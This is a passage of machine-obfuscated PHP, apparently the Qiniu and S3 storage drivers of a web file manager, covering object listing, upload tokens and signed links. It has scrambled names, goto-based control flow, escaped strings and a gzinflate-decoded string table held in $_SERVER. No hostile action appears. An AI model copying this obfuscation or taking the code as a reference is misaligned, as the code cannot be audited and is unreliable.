$a¯ˆ…âÀí¼[$f¤“§Š”À‘[291]]); self::valueSet($this->task[$f¤“§Š”À‘[363]], $this->task); } public function progressEnd($d›©îÃ÷ù) { $b¯è‘ÅœªŠ =& $_SERVER[Ö¹ñÒÁ²÷]; self::log($b¯è‘ÅœªŠ[1479] . $this->task[$b¯è‘ÅœªŠ[363]]); $this->end(); } public function progress($bË‡æ›ãï, $fÍö´ï”², $fÁğØ£¡­, $e‹àØØ§Ğ×, $aÒÚ°œÕ) { $aóÍš£ïŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $aœœ¬æÊëÖ =& $this->task; if ($aÒÚ°œÕ > 0) { $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]] = $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]] == 0 ? $e‹àØØ§Ğ× : $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]]; $aœœ¬æÊëÖ[$aóÍš£ïŞ[984]] = $aÒÚ°œÕ; } else { if ($fÁğØ£¡­ > 0) { $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]] = $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]] == 0 ? $fÍö´ï”² : $aœœ¬æÊëÖ[$aóÍš£ïŞ[972]]; $aœœ¬æÊëÖ[$aóÍš£ïŞ[984]] = $fÁğØ£¡­; } } $this->update(); self::log("\160\162\157\147\162\x65\x73\163\110\164\x74\160\72\144\157\167\x6e\72{$fÁğØ£¡­}\57{$fÍö´ï”²}\73\x20\165\x70\x6c\x6f\141\x64\x3a{$aÒÚ°œÕ}\57{$e‹àØØ§Ğ×}\73"); } } $eÖæ¥Ğ„Ô = LIB_DIR . $_SERVER[Ö¹ñÒÁ²÷][1480]; goto FË·õ’£; F µŞ‹…Ï: $d¦ÛÇ•óâ¦ = $_SERVER[Ö¹ñÒÁ²÷][543]; $_SERVER[öÉÊ¬›µ–¾¦ƒ] = explode($_SERVER[Ö¹ñÒÁ²÷][544], gzinflate(substr($_SERVER[Ö¹ñÒÁ²÷][545], 10, -8))); $Aä—Ã‰…‹ = $_SERVER[Ö¹ñÒÁ²÷][546]; goto C¤ÒŠ¾´¼; cÄŠßèŸ¡Ì: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($fÅÕ¬´¯«) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ö¹ñÒÁ²÷][1198]; $this->_init($fÅÕ¬´¯«); } public function _init($E–¾Åï¤À…) { foreach ($E–¾Åï¤À… as $C™ê˜½‘ğ÷ => $e¶»ŠÜòº) { if (isset($this->{$C™ê˜½‘ğ÷})) { $this->{$C™ê˜½‘ğ÷} = $e¶»ŠÜòº; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ö¹ñÒÁ²÷][1199], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($DÀêÆ±‰££, $c¢çÆ…×‡ã = '', $fôŞ¬³ø« = REPEAT_RENAME) { if ($this->setContent($DÀêÆ±‰££, $c¢çÆ…×‡ã)) { return $this->getPathOuter($DÀêÆ±‰££); } return !1; } public function mkdir($c·çà‘«Ã¼, $bîÜ†óÑùÉ = REPEAT_SKIP) { goto eÅáå…‚´÷; Eİ–Üí–Ñß: $c·çà‘«Ã¼ = $f“‹§¶”¾ . $aáæÇ”Åôƒ[8]; $Câ”Ü¬™² = get_path_this($f“‹§¶”¾); $AÙèè¦ïí = $c·çà‘«Ã¼ . $Câ”Ü¬™²; goto a¡´Ûäİ„Ç; a¡´Ûäİ„Ç: if (!$this->mkfile($AÙèè¦ïí)) { return !1; } if (!$this->moveFile($AÙèè¦ïí, $c·çà‘«Ã¼)) { $this->delFile($AÙèè¦ïí); return !1; } return $this->getPathOuter($f“‹§¶”¾); goto B´ï™˜×º½; eÅáå…‚´÷: $aáæÇ”Åôƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $f“‹§¶”¾ = trim($c·çà‘«Ã¼, $aáæÇ”Åôƒ[8]); if ($this->_isFolder($f“‹§¶”¾)) { return $this->getPathOuter($f“‹§¶”¾); } goto Eİ–Üí–Ñß; B´ï™˜×º½: } public function copyFile($EĞ˜Æ³ÒÈ§, $DñëØ¼‚ Š) { $AÓˆˆ‡¹à† = $this->bucketManager->copy($this->bucket, $EĞ˜Æ³ÒÈ§, $this->bucket, $DñëØ¼‚ Š, !0); return $AÓˆˆ‡¹à† ? !1 : !0; } public function moveFile($e ç—Åç“, $C­á«ùÕë„) { $BÙÜøà…¥Í = $this->bucketManager->move($this->bucket, $e ç—Åç“, $this->bucket, $C­á«ùÕë„, !0); return $BÙÜøà…¥Í ? !1 : !0; } public function delFile($c–Æãöš) { $e·ÂƒÖñÓÛ = $this->bucketManager->delete($this->bucket, $c–Æãöš); return $e·ÂƒÖñÓÛ ? !1 : !0; } public function delFolder($céŠËêçÌ) { $fÖ¥†‡¬“ = $this->fileList($céŠËêçÌ); if (empty($fÖ¥†‡¬“)) { return !0; } $E«çğŠÊ§ = 1000; if (count($fÖ¥†‡¬“) <= $E«çğŠÊ§) { return $this->qnDelObj($fÖ¥†‡¬“) ? !1 : !0; } foreach (array_chunk($fÖ¥†‡¬“, $E«çğŠÊ§) as $f³ƒÀğŸ‡Œ) { $CóãÃ° = $this->qnDelObj($f³ƒÀğŸ‡Œ); if ($CóãÃ°) { return !1; } } return !0; } private function qnDelObj($aôÏµ±Í¦) { $E¿Üˆù¿ƒ‰ = $this->bucketManager->buildBatchDelete($this->bucket, $aôÏµ±Í¦); list($cëËÙâ‹ƒ†, $bºÊ¨‡Ö¶²) = $this->bucketManager->batch($E¿Üˆù¿ƒ‰); return $bºÊ¨‡Ö¶²; } private function fileList($a¸½õ™‹”æ, $cÎì…¾„çÂ = 0) { goto EËãö‰ËÂ; EËãö‰ËÂ: $e”ñ’†¯¼• =& $_SERVER[Ö¹ñÒÁ²÷]; $a¸½õ™‹”æ = trim($a¸½õ™‹”æ, $e”ñ’†¯¼•[8]); $D¢Ñ Ê™È¦ = empty($a¸½õ™‹”æ) ? $e”ñ’†¯¼•[33] : $a¸½õ™‹”æ . $e”ñ’†¯¼•[8]; goto d¶«Ã‹Êä†; d¶«Ã‹Êä†: $FãÆ¦ªÁ¾Ş = $e”ñ’†¯¼•[33]; $B³è“Úî– = 1000; $B‰ëÊÚ‘ª = $e”ñ’†¯¼•[33]; goto C³õÂ–÷ÈÈ; C³õÂ–÷ÈÈ: $b†³„ÒóÃ± = array(); while (!0) { list($eœ»¡Ûˆ×, $c¶˜Œé¤ºÃ) = $this->bucketManager->listFiles($this->bucket, $D¢Ñ Ê™È¦, $FãÆ¦ªÁ¾Ş, $B³è“Úî–, $B‰ëÊÚ‘ª); if ($c¶˜Œé¤ºÃ) { return !1; } $FãÆ¦ªÁ¾Ş = array_key_exists($e”ñ’†¯¼•[1169], $eœ»¡Ûˆ×) ? $FãÆ¦ªÁ¾Ş = $eœ»¡Ûˆ×[$e”ñ’†¯¼•[1200]] : $e”ñ’†¯¼•[33]; foreach ($eœ»¡Ûˆ×[$e”ñ’†¯¼•[1201]] as $fØˆã¨Œ´¯) { $DëÊ­ÏÇêƒ = $fØˆã¨Œ´¯[$e”ñ’†¯¼•[89]]; if ($cÎì…¾„çÂ) { $DëÊ­ÏÇêƒ = array($e”ñ’†¯¼•[28] => $DëÊ­ÏÇêƒ, $e”ñ’†¯¼•[77] => $fØˆã¨Œ´¯[$e”ñ’†¯¼•[1202]]); } $b†³„ÒóÃ±[] = $DëÊ­ÏÇêƒ; } if ($FãÆ¦ªÁ¾Ş == $e”ñ’†¯¼•[33]) { break; } } return $b†³„ÒóÃ±; goto Fé§ò‹œ; Fé§ò‹œ: } public function rename($B£¶·Í¥ç, $FÊÕ ¯İÅ‘) { return $this->renameObject($B£¶·Í¥ç, $FÊÕ ¯İÅ‘); } public function fileInfo($f»£ÄÍ÷ˆ, $AÕ¤ƒ›¾›½ = false, $A¾ŒÄ†âİ• = array()) { goto D¬¬¼¤¬ ™; A¹´šˆ›ä§: if (empty($A¾ŒÄ†âİ•)) { $A¾ŒÄ†âİ• = $this->objectMeta($f»£ÄÍ÷ˆ); if (!$A¾ŒÄ†âİ•) { return $Bííöê¬ä†; } } if (isset($A¾ŒÄ†âİ•[$C…á§µÑ¡[1203]])) { $Bííöê¬ä†[$C…á§µÑ¡[183]] = $A¾ŒÄ†âİ•[$C…á§µÑ¡[1203]]; } if (isset($A¾ŒÄ†âİ•[$C…á§µÑ¡[1202]])) { $Bííöê¬ä†[$C…á§µÑ¡[77]] = $A¾ŒÄ†âİ•[$C…á§µÑ¡[1202]]; } goto bº³ÒÑµˆ÷; bº³ÒÑµˆ÷: return $Bííöê¬ä†; goto e¹­¸£ÏÒª; D¬¬¼¤¬ ™: $C…á§µÑ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($AÕ¤ƒ›¾›½) { return array($C…á§µÑ¡[28] => $this->pathThis($f»£ÄÍ÷ˆ), $C…á§µÑ¡[75] => $this->getPathOuter($C…á§µÑ¡[8] . $f»£ÄÍ÷ˆ), $C…á§µÑ¡[29] => $C…á§µÑ¡[163], $C…á§µÑ¡[77] => isset($A¾ŒÄ†âİ•[$C…á§µÑ¡[1202]]) ? $A¾ŒÄ†âİ•[$C…á§µÑ¡[1202]] : 0, $C…á§µÑ¡[156] => $this->ext($f»£ÄÍ÷ˆ)); } $Bííöê¬ä† = array($C…á§µÑ¡[28] => $this->pathThis($f»£ÄÍ÷ˆ), $C…á§µÑ¡[75] => $this->getPathOuter($C…á§µÑ¡[8] . $f»£ÄÍ÷ˆ), $C…á§µÑ¡[29] => $C…á§µÑ¡[163], $C…á§µÑ¡[183] => 0, $C…á§µÑ¡[106] => 0, $C…á§µÑ¡[77] => 0, $C…á§µÑ¡[156] => $this->ext($f»£ÄÍ÷ˆ), $C…á§µÑ¡[184] => !0, $C…á§µÑ¡[185] => !0); goto A¹´šˆ›ä§; e¹­¸£ÏÒª: } public function folderInfo($E¨åµ³½ğ…, $aíäÎùÚ‘¶ = false) { goto a¾ïÌ¥–Ïñ; eô‰‚ê•Ş‚: return $e§‰ÆÄ¡¿ô; goto EÛâ¤ªĞïò; a¾ïÌ¥–Ïñ: $E½¥„ç‡¡Û =& $_SERVER[Ö¹ñÒÁ²÷]; if ($aíäÎùÚ‘¶) { return array($E½¥„ç‡¡Û[28] => $this->pathThis($E¨åµ³½ğ…), $E½¥„ç‡¡Û[75] => $this->getPathOuter($E½¥„ç‡¡Û[8] . $E¨åµ³½ğ…), $E½¥„ç‡¡Û[29] => $E½¥„ç‡¡Û[76]); } $e§‰ÆÄ¡¿ô = array($E½¥„ç‡¡Û[28] => $this->pathThis($E¨åµ³½ğ…), $E½¥„ç‡¡Û[75] => $this->getPathOuter($E½¥„ç‡¡Û[8] . $E¨åµ³½ğ…), $E½¥„ç‡¡Û[29] => $E½¥„ç‡¡Û[76], $E½¥„ç‡¡Û[183] => 0, $E½¥„ç‡¡Û[106] => 0, $E½¥„ç‡¡Û[1148] => !0, $E½¥„ç‡¡Û[1149] => !0); goto cÈ…ÉÍî–; cÈ…ÉÍî–: $E¨åµ³½ğ… = rtrim($E¨åµ³½ğ…, $E½¥„ç‡¡Û[8]) . $E½¥„ç‡¡Û[8]; $bó“†Ä²ØÓ = $this->objectMeta($E¨åµ³½ğ…); if (isset($bó“†Ä²ØÓ[$E½¥„ç‡¡Û[1203]])) { $e§‰ÆÄ¡¿ô[$E½¥„ç‡¡Û[183]] = $bó“†Ä²ØÓ[$E½¥„ç‡¡Û[1203]]; } goto eô‰‚ê•Ş‚; EÛâ¤ªĞïò: } public function listPath($D—¶œ˜ŒĞÂ, $bëÆ‰Ò˜Ù± = false) { goto eä§½™–ƒ; eä§½™–ƒ: $dÌØ×õ¾š =& $_SERVER[Ö¹ñÒÁ²÷]; $D—¶œ˜ŒĞÂ = trim($D—¶œ˜ŒĞÂ, $dÌØ×õ¾š[8]); $e¤›“º¬»¾ = empty($D—¶œ˜ŒĞÂ) ? $dÌØ×õ¾š[33] : $D—¶œ˜ŒĞÂ . $dÌØ×õ¾š[8]; goto C„ò†èçê¯; C„ò†èçê¯: $a¦‹ÕÑÛ…Æ = $dÌØ×õ¾š[33]; $EÕ¦›Š·¸° = 1000; $C°åó‹¾ = $dÌØ×õ¾š[8]; goto A˜ŞÆ¤§É¯; A˜ŞÆ¤§É¯: $Aºöª¥ÇºÃ = $BÆ­îôŒİ = array(); while (!0) { list($a¨ÈÔàÏ‰, $Dæ¹¹Šİ¤¬) = $this->bucketManager->listFiles($this->bucket, $e¤›“º¬»¾, $a¦‹ÕÑÛ…Æ, $EÕ¦›Š·¸°, $C°åó‹¾); if ($Dæ¹¹Šİ¤¬) { return !1; } $a¦‹ÕÑÛ…Æ = array_key_exists($dÌØ×õ¾š[1169], $a¨ÈÔàÏ‰) ? $a¦‹ÕÑÛ…Æ = $a¨ÈÔàÏ‰[$dÌØ×õ¾š[1200]] : $dÌØ×õ¾š[33]; if (isset($a¨ÈÔàÏ‰[$dÌØ×õ¾š[1204]])) { foreach ($a¨ÈÔàÏ‰[$dÌØ×õ¾š[1204]] as $cª§Â´¤¿) { if ($cª§Â´¤¿ == $e¤›“º¬»¾) { continue; } $Aºöª¥ÇºÃ[] = $this->folderInfo($cª§Â´¤¿, $bëÆ‰Ò˜Ù±); } } if (isset($a¨ÈÔàÏ‰[$dÌØ×õ¾š[1201]])) { foreach ($a¨ÈÔàÏ‰[$dÌØ×õ¾š[1201]] as $FÄµ½šÁ©Ì) { if ($FÄµ½šÁ©Ì[$dÌØ×õ¾š[89]] == $e¤›“º¬»¾) { continue; } $BÆ­îôŒİ[] = $this->fileInfo($FÄµ½šÁ©Ì[$dÌØ×õ¾š[89]], $bëÆ‰Ò˜Ù±, $FÄµ½šÁ©Ì); } } if ($a¦‹ÕÑÛ…Æ == $dÌØ×õ¾š[33]) { break; } } return array($dÌØ×õ¾š[74] => $Aºöª¥ÇºÃ, $dÌØ×õ¾š[73] => $BÆ­îôŒİ); goto eµ¦šì¯‘«; eµ¦šì¯‘«: } public function has($FÊêãŠ‘Ä™, $B“²²»Û¡Í = false, $d×Ã±‡‘º = true) { goto fÑöğÃ¾á; bˆ†ê×°êõ: $Bµ­…¿µšÀ = 0; $Cª¿ÚŠÎ± = 0; while (!0) { list($B®›„å°‰Â, $B¶Ä ±ƒ½) = $this->bucketManager->listFiles($this->bucket, $Då„¨šåó¶, $bê²¾õé, $FŠ¦á‰ÉŸ», $D‰Œ¸»Ò¼ô); if ($B¶Ä ±ƒ½) { return !1; } $bê²¾õé = array_key_exists($d´ì«ê­à•[1169], $B®›„å°‰Â) ? $bê²¾õé = $B®›„å°‰Â[$d´ì«ê­à•[1200]] : $d´ì«ê­à•[33]; if ($B“²²»Û¡Í) { if (!empty($B®›„å°‰Â[$d´ì«ê­à•[1201]])) { $Bµ­…¿µšÀ += count($B®›„å°‰Â[$d´ì«ê­à•[1201]]); } if (!empty($B®›„å°‰Â[$d´ì«ê­à•[1204]])) { $Cª¿ÚŠÎ± += count($B®›„å°‰Â[$d´ì«ê­à•[1204]]); } if ($bê²¾õé === $d´ì«ê­à•[33]) { break; } continue; } if ($d×Ã±‡‘º) { if (!empty($B®›„å°‰Â[$d´ì«ê­à•[1201]])) { return !0; } } else { if (!empty($B®›„å°‰Â[$d´ì«ê­à•[1204]])) { return !0; } } if ($bê²¾õé == $d´ì«ê­à•[33]) { break; } } goto E§ô‘‘Ãˆ˜; e•Õº‰²ëì: $bê²¾õé = $d´ì«ê­à•[33]; $FŠ¦á‰ÉŸ» = 1000; $D‰Œ¸»Ò¼ô = $d´ì«ê­à•[8]; goto bˆ†ê×°êõ; fÑöğÃ¾á: $d´ì«ê­à• =& $_SERVER[Ö¹ñÒÁ²÷]; $FÊêãŠ‘Ä™ = trim($FÊêãŠ‘Ä™, $d´ì«ê­à•[8]); $Då„¨šåó¶ = empty($FÊêãŠ‘Ä™) ? $d´ì«ê­à•[33] : $FÊêãŠ‘Ä™ . $d´ì«ê­à•[8]; goto e•Õº‰²ëì; E§ô‘‘Ãˆ˜: if ($B“²²»Û¡Í) { return array($d´ì«ê­à•[187] => $Bµ­…¿µšÀ, $d´ì«ê­à•[188] => $Cª¿ÚŠÎ±); } return !1; goto d—–Úğ“Í; d—–Úğ“Í: } public function listAll($fö§ó±µÃŒ) { $Cï³÷­ôë½ =& $_SERVER[Ö¹ñÒÁ²÷]; $A¼ÃÔÍİ™ = $this->fileList($fö§ó±µÃŒ, 1); $Aãã‡Œ¾ÉÜ = array(); foreach ($A¼ÃÔÍİ™ as $eãõâ‰†Ñ‹) { $Aãã‡Œ¾ÉÜ[$eãõâ‰†Ñ‹[$Cï³÷­ôë½[28]]] = $eãõâ‰†Ñ‹[$Cï³÷­ôë½[77]]; } return $this->listAllFiles($fö§ó±µÃŒ, array_keys($Aãã‡Œ¾ÉÜ), $Aãã‡Œ¾ÉÜ); } public function canRead($a¡í½ã…ïÅ) { return $this->exist($a¡í½ã…ïÅ) ? !0 : !1; } public function canWrite($câÙ¨£â¯„) { return $this->exist($câÙ¨£â¯„) ? !0 : !1; } public function getContent($d»ÎÌÉ¼×³) { return $this->fileSubstr($d»ÎÌÉ¼×³, 0, -1); } public function setContent($fá×ÒğÁ, $c¸Ì °£Èù = '') { $B¼«“†Ï– = $this->tempFile($this->pathThis($fá×ÒğÁ)); file_put_contents($B¼«“†Ï–, $c¸Ì °£Èù); if ($this->upload($fá×ÒğÁ, $B¼«“†Ï–)) { $this->tempFileRemve($B¼«“†Ï–); return !0; } return !1; } public function refreshUrls($EñÌå¹İñÚ) { goto cøˆƒŒÑ“°; bÈ«ã›£‡: $B²³§£Ô ¶ = new Qiniu\Cdn\CdnManager($this->auth); list($e˜«ğŞ´, $F£¡äÕğĞŒ) = $B²³§£Ô ¶->refreshUrls($DÑ‰Ä¤ìÖ«); if ($F£¡äÕğĞŒ) { return !1; } goto c¤°ß˜šÒÙ; c¤°ß˜šÒÙ: return $e˜«ğŞ´[$e¹‰˜¿ñ§[1205]] == $e¹‰˜¿ñ§[693] ? !0 : !1; goto Eò„«­Ó¥Œ; cøˆƒŒÑ“°: $e¹‰˜¿ñ§ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÑ‰Ä¤ìÖ« = array(); if (is_array($EñÌå¹İñÚ)) { foreach ($EñÌå¹İñÚ as $Eƒ†°Â±¶é) { $DÑ‰Ä¤ìÖ«[] = $this->link($Eƒ†°Â±¶é); } } else { $DÑ‰Ä¤ìÖ«[] = $this->link($EñÌå¹İñÚ); } goto bÈ«ã›£‡; Eò„«­Ó¥Œ: } public function fileSubstr($cš­–‚Ñª˜, $eÊ§±ø©, $dƒó„¦Ç”) { $BÆ—ÑƒŞ³é =& $_SERVER[Ö¹ñÒÁ²÷]; if (!($c†øÜğŠºá = $this->link($cš­–‚Ñª˜))) { return !1; } $f”©Õ°ŠŸî = !1; if ($dƒó„¦Ç” > 0) { $AÈõï™Ñ½ = $eÊ§±ø© + $dƒó„¦Ç” - 1; $f”©Õ°ŠŸî = array($BÆ—ÑƒŞ³é[1206] . $eÊ§±ø© . $BÆ—ÑƒŞ³é[408] . $AÈõï™Ñ½); } $B¨Òóêï˜ = url_request($c†øÜğŠºá, $BÆ—ÑƒŞ³é[212], !1, $f”©Õ°ŠŸî); return $B¨Òóêï˜[$BÆ—ÑƒŞ³é[686]] ? $B¨Òóêï˜[$BÆ—ÑƒŞ³é[1028]] : !1; } public function upload($cï¹ÜÓ²¶«, $eŒ±©ã”º², $D“ïå—ß¾ = false, $aŒ‹åôŠÎ = REPEAT_REPLACE) { $d†ªÇòğ– = new Qiniu\Storage\UploadManager(); $a“‡ë…ª³ƒ = $this->auth->uploadToken($this->bucket, $cï¹ÜÓ²¶«); $e¨­Ù¼ƒ = get_file_mime(get_path_ext($eŒ±©ã”º²)); list($a“¿¿¼ËÈ‹, $däº‡ÕªŸ) = $d†ªÇòğ–->putFile($a“‡ë…ª³ƒ, $cï¹ÜÓ²¶«, $eŒ±©ã”º², null, $e¨­Ù¼ƒ); return $däº‡ÕªŸ ? !1 : $this->getPathOuter($cï¹ÜÓ²¶«); } public function uploadFormData($f°­›®§˜ç, $aÛ¡ãŠŒó‚ = 3600) { return $this->uploadToken($f°­›®§˜ç, $aÛ¡ãŠŒó‚); } public function multiUploadFormData($fµë®ê¼‡µ, $bµò³¶¨¼Î = 3600) { return $this->uploadToken($fµë®ê¼‡µ, $bµò³¶¨¼Î); } private function uploadToken($bè‘…Û™œ´, $B¢÷ÙÛµÕ¹ = 3600) { goto B¨¨¶šœó; B¨¨¶šœó: $f‹‡öâ„˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $CòãÒÒÒ³‰ = $B¢÷ÙÛµÕ¹; $f”çæùÃğè = array($f‹‡öâ„˜[1207] => $f‹‡öâ„˜[1208]); goto E¯¤İïÉ; E¯¤İïÉ: $DºÆ¯ùôß = null; $dÌ§ˆ¹¿Ûè = $this->auth->uploadToken($this->bucket, $DºÆ¯ùôß, $CòãÒÒÒ³‰, $f”çæùÃğè, !0); $b¿ĞÆ«ŞÌ = empty($this->region) || $this->region == $f‹‡öâ„˜[1209] ? $f‹‡öâ„˜[33] : $f‹‡öâ„˜[408] . $this->region; goto aÕëÛéë†; aÕëÛéë†: $bá‘Éº¦ğ© = http_type() . "\72\57\57\x75\160\x6c\x6f\x61\x64{$b¿ĞÆ«ŞÌ}\56\161\151\156\x69\x75\x70\x2e\143\157\155\57"; return array($f‹‡öâ„˜[1210] => $dÌ§ˆ¹¿Ûè, $f‹‡öâ„˜[1211] => $bá‘Éº¦ğ©); goto fê¸ø›Öêš; fê¸ø›Öêš: } public function download($A«¨ä£¹óò, $fÏÍ¹İÏ—æ) { goto BØÃÒ™Ğ¹İ; E‘…¶ŒÚŸÙ: fclose($aÑ”ëŒËœ); return $fÏÍ¹İÏ—æ; goto b„ßåÄÆâæ; BØÃÒ™Ğ¹İ: $AŒù¤ğàùõ = IO::getPathInner(IO::mkfile($fÏÍ¹İÏ—æ)); if (!($A°é­¢ÊœÒ = $this->link($A«¨ä£¹óò))) { return !1; } $aÑŞ¶«¢÷ = 0; goto fÀªÔ´–Ã¬; fÀªÔ´–Ã¬: $FášŒ ÌÒ  = 1024 * 200; $aÑ”ëŒËœ = fopen($AŒù¤ğàùõ, $_SERVER[Ö¹ñÒÁ²÷][1212]); while (!0) { $d´÷­òù¬ = $this->fileSubstr($A«¨ä£¹óò, $aÑŞ¶«¢÷, $FášŒ ÌÒ ); if ($d´÷­òù¬ === !1) { return !1; } fwrite($aÑ”ëŒËœ, $d´÷­òù¬); $aÑŞ¶«¢÷ += $FášŒ ÌÒ ; if (strlen($d´÷­òù¬) < $FášŒ ÌÒ ) { break; } } goto E‘…¶ŒÚŸÙ; b„ßåÄÆâæ: } public function link($d¦Ï²Í‘, $BÛ¤Å…Ä«‚ = '') { if (!$this->isFile($d¦Ï²Í‘)) { return !1; } $bæ¸ŞÊ½Ê· = $this->getHost() . $_SERVER[Ö¹ñÒÁ²÷][8] . $this->pathEncode($d¦Ï²Í‘) . $BÛ¤Å…Ä«‚; return $this->auth->privateDownloadUrl($bæ¸ŞÊ½Ê·, 3600 * 12); } public function fileOut($Bâô³š·¡÷, $C–Œä‘çî = false, $dÀ»‚•˜°ì = false, $aŠŸÎ†ãìø = '') { $AÁ¥Éïéé³ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$dÀ»‚•˜°ì) { $dÀ»‚•˜°ì = $this->pathThis($Bâô³š·¡÷); } $A×Í‰ÇÛ÷² = $C–Œä‘çî ? $AÁ¥Éïéé³[1213] . rawurlencode($dÀ»‚•˜°ì) : $AÁ¥Éïéé³[33]; $e†ˆ«ì¶Î = $this->link($Bâô³š·¡÷, $A×Í‰ÇÛ÷²); $this->fileOutLink($e†ˆ«ì¶Î); } public function fileOutServer($D¢º÷ÙŞùÀ, $D»Ãİ“ˆ = false, $Cáù–¸Ş¦ = false, $Cñ‡¿£Ô‰ = '') { parent::fileOut($D¢º÷ÙŞùÀ, $D»Ãİ“ˆ, $Cáù–¸Ş¦, $Cñ‡¿£Ô‰); } public function fileOutImage($CÔØÉ±¥Ñô, $fÛØ×çŠœ = 250) { $cù‹¶¯âÉç = $this->link($CÔØÉ±¥Ñô, $_SERVER[Ö¹ñÒÁ²÷][1214] . $fÛØ×çŠœ); $this->fileOutLink($cù‹¶¯âÉç); } public function fileOutImageServer($b¡ÅÃ’İ, $a‰¤ÌÇéË® = 250) { parent::fileOutImage($b¡ÅÃ’İ, $a‰¤ÌÇéË®); } public function hashMd5($aÙâĞóÂö) { $fàÅÆ™Ô×ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $BÉ¿œ¹Ã°è = $this->objectMeta($aÙâĞóÂö); return isset($BÉ¿œ¹Ã°è[$fàÅÆ™Ô×ñ[192]]) ? $BÉ¿œ¹Ã°è[$fàÅÆ™Ô×ñ[192]] : !1; $EÛÄ¥¾ØÉ = $this->link($aÙâĞóÂö, $fàÅÆ™Ô×ñ[1215]); } public function size($b®ğôÍöğ) { $DÀ¦„È›Ó = $this->objectMeta($b®ğôÍöğ); return $DÀ¦„È›Ó ? $DÀ¦„È›Ó[$_SERVER[Ö¹ñÒÁ²÷][77]] : 0; } public function info($bÏÔù˜ªã) { if ($this->isFolder($bÏÔù˜ªã)) { return $this->folderInfo($bÏÔù˜ªã); } else { if ($this->isFile($bÏÔù˜ªã)) { return $this->fileInfo($bÏÔù˜ªã); } } return !1; } public function exist($F‚ŸÒª¶£) { return $this->isFile($F‚ŸÒª¶£) || $this->isFolder($F‚ŸÒª¶£); } public function isFile($Aƒ ¯çí¤¶) { return !$this->isFolder($Aƒ ¯çí¤¶) && $this->objectMeta($Aƒ ¯çí¤¶); } public function isFolder($bÎŒÉïƒ) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][219], $bÎŒÉïƒ); } protected function objectMeta($C“§‘¿ŸêÛ) { return $this->cacheMethod($_SERVER[Ö¹ñÒÁ²÷][220], $C“§‘¿ŸêÛ); } protected function _objectMeta($F…¼ôë­ÅÎ) { $f‡ñŒ³¾»… =& $_SERVER[Ö¹ñÒÁ²÷]; list($fò÷Ê±Œø, $aù÷ó·õ¡Ù) = $this->bucketManager->stat($this->bucket, $F…¼ôë­ÅÎ); if ($fò÷Ê±Œø) { $fò÷Ê±Œø[$f‡ñŒ³¾»…[77]] = intval($fò÷Ê±Œø[$f‡ñŒ³¾»…[1202]]); } return $fò÷Ê±Œø; } protected function _isFolder($a©î¸ÛŸê) { $c«Í°»§ñ§ =& $_SERVER[Ö¹ñÒÁ²÷]; list($B…¦™áøí, $CÂ†ÍŸ‹ ) = $this->bucketManager->listFiles($this->bucket, trim($a©î¸ÛŸê, $c«Í°»§ñ§[8]) . $c«Í°»§ñ§[8], $c«Í°»§ñ§[33], 1, $c«Í°»§ñ§[8]); return !empty($B…¦™áøí[$c«Í°»§ñ§[1201]]) || !empty($B…¦™áøí[$c«Í°»§ñ§[1204]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eåª†Ô°‹) { parent::__construct($eåª†Ô°‹); } public function uploadFormData($eŞÇÕáé“‰, $Eì¯»İ¬Ş = 3600) { goto F™ê†ÇĞ„ó; a ÏïÖ¶É©: $f«“™Ü¦Á = hash_hmac($a°Ê°éÃ›±[1130], $A•Ğ¢¡Ä×¸, $A©Œ‚ÇÅ®, !0); $f‘Ê«¾ë”¸ = hash_hmac($a°Ê°éÃ›±[1130], $Cœùš±¤Ç, $f«“™Ü¦Á, !0); $fœ‘¢±¼•º = hash_hmac($a°Ê°éÃ›±[1130], $fˆÀŸËÕ´Í, $f‘Ê«¾ë”¸); goto cÖœÅØ¸øİ; cÖœÅØ¸øİ: $däé–ÅÁ¿ = array($a°Ê°éÃ›±[195] => $a°Ê°éÃ›±[33], $a°Ê°éÃ›±[1132] => $a°Ê°éÃ›±[33], $a°Ê°éÃ›±[1091] => $B”®£ˆÚ†, $a°Ê°éÃ›±[1095] => $c°«‘„õØ½, $a°Ê°éÃ›±[1099] => $fˆÀŸËÕ´Í, $a°Ê°éÃ›±[1133] => $B˜æİ—ê–‹, $a°Ê°éÃ›±[1134] => $fÛ¨ºÎƒÖ, $a°Ê°éÃ›±[1135] => $bôÑÇç²·ò, $a°Ê°éÃ›±[1136] => $CŠƒ‚š—†, $a°Ê°éÃ›±[1137] => $fœ‘¢±¼•º, $a°Ê°éÃ›±[165] => $this->getHost()); return $däé–ÅÁ¿; goto Cµ’’ŒŒàÊ; e‰ÙùšîŒ: $Cœùš±¤Ç = $a°Ê°éÃ›±[1122]; $CŠƒ‚š—† = $Eì¯»İ¬Ş . $a°Ê°éÃ›±[33]; $c°«‘„õØ½ = $a°Ê°éÃ›±[1087]; goto E”à½Şã‰Ú; E”à½Şã‰Ú: $eøçÈ³±©õ = array($this->accessKey, $fë¢¶ãæ÷, $this->region, $A•Ğ¢¡Ä×¸, $Cœùš±¤Ç); $B˜æİ—ê–‹ = implode($a°Ê°éÃ›±[8], $eøçÈ³±©õ); $fœßÈŞŸù‹ = array($a°Ê°éÃ›±[1089] => gmdate($a°Ê°éÃ›±[1088], 